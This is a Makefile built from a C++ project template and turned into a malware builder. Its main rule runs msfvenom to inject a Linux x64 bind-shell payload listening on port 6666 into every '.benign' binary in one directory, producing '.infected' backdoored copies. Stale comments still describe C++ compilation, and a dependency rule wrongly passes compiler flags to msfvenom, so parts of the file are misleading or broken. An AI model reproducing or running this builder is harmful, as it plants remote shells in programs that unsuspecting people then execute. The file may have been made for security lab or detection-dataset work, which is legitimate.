################################################################################
# Name            : Makefile
# Project         : FIX ME
# Description     : Main Makefile
# Creation Date   : Fri May 16 14:59:49 2014
# Original Author : jharwell
# Editing Authors : Tyler Westland
#
# Note: This file is -j (parallel build) safe, provided you don't mess with it
# too much.
#
#  Products:
#  Make Target     Product                  Description
#  ===========     =======                  ===================
#  all             bin/$PROJECT             The main executable
#  clean           N/A                      Removes excutable, all .o
#  veryclean       N/A                      Everything clean removes, +
#                                           the external libraries
#  bin/$Project    bin/$PROJECT             The main executable
#  documentation   Various                  Generates documentation for
#                                           project from the doxygen
#                                           comments/markup in the code
################################################################################

###############################################################################
# Project Name
###############################################################################
PROJECT = Project
###############################################################################
# Directory Definitions
###############################################################################
# benign_files/      - Root of the source tree for the project
# bin/      - Directory where all executables are built
# infected_files/      - Directory where all infected_filesect files are built
# ext/      - Direcotry for all external libraries
# ext/lib/  - Directory for installation of all external libraries
# doc/      - Directory where all documentation lives
# config/   - Directory for all autoconf/configure/automake inputs/output
BENIGNDIR       = ./benign_files
INFDIR          = ./infected_files

###############################################################################
# Definitions
###############################################################################

# Tell make we want to execute all commands using bash (otherwise it uses
# sh). make generally works best with bash, and as SHELL is inherited from the
# invoking shell when make is run, it may have a value like sh, tcsh, etc. If
# you don't do this, then some shell commands will not behave as you
# expect. This is in keeping with the principle of least surprise.
SHELL           = bash

###############################################################################
# C++ Compilation Options
###############################################################################

# Specify the compiler flags to use when compiling. Note the use of fopenmp in
# order to enable OpenMP pragmas in the code.
define MSFFLAGS
-a x64 --platform linux -p linux/x64/shell_bind_tcp LPORT=6666 -f elf
endef

# Define the compiler to use
MSF         = msfvenom

###############################################################################
# Functions
###############################################################################
# Recursive wildcard: search a list of directories for all files that match a pattern
# usage: $(call rwildcard, $(DIRS1) $(DIRS2) ..., pattern)
#
# All directory lists passed as first arg must be separated by spaces, and they
# themselves must be space separated as well. There must NOT be a space between
# the last dir list the , and the start of the pattern.
#
# You should never need to modify this.
# usage: $(call rwildcard, $(DIRS1) $(DIRS2) ..., pattern)
rwildcard=$(foreach d,$(wildcard $1*),$(call rwildcard,$d/,$2)  $(filter $(subst *,%,$2),$d))

# make-depend: generate dependencies for C++ source files dynamically. Very useful
# for including .h files as target dependencies.
# usage: $(call make-depend,source-file,infected_filesect-file,depend-file)
#
# You should never need to modify this.
# usage: $(call make-depend,source-file,infected_filesect-file,depend-file)
make-depend-cxx=$(MSF) -MM -MF $3 -MP -MT $2 $(MSFFLAGS) $1

###############################################################################
# Target Definitions
###############################################################################
# Define what directories to search for source code. For us, this will just
# be a single source directory, benign_files/.
BENIGNS = $(BENIGNDIR)

# Define the list of files to compile for this project, which is built by
# recursively finding all .cc files in benign_files/.
SRC_MSF = $(call rwildcard,$(BENIGNS),*.benign)

# For each of the .cc files found under benign_files/, determine the name of the
# corresponding .o file to create in infected_files/ via pattern substitution (patsust).
INFECTED_MSF = $(notdir $(patsubst %.benign,%.infected,$(SRC_MSF)))

###############################################################################
# All targets
###############################################################################

# Phony targets: targets of this type will be run everytime by make (i.e. make
# does not assume that the target recipe will build the target name)
.PHONY: clean veryclean all documentation

# The default target which will be run if the user just types "make" with a
# target name
all: $(addprefix $(INFDIR)/, $(INFECTED_MSF)) | $(INFDIR)

# The Objectifier. This rule says that each .o file in infected_files/, depends on the
# presence of the infected_files/ directory. This is necessary so that parallel make
# (make -j) works.
$(addprefix $(INFDIR)/, $(INFECTED_MSF)): | $(INFDIR)


# Bootstrap Bill. This creates all of the order-only prerequisites; that is,
# files/directories that have to be present in order for a given target build
# to succeed, but that make knows do not need to be remade each time their
# modification time is updated and they are newer than the target being built.
$(INFDIR):
  @mkdir -p $@

# The Cleaner. Clean up the project, by removing ALL files generated during
# the build process to build the main target.
clean:
  @rm -rf $(INFDIR)

###############################################################################
# Pattern Rules
###############################################################################
$(INFDIR)/%.infected: $(BENIGNDIR)/%.benign
  $(MSF) $(MSFFLAGS) -o $@ -x $<

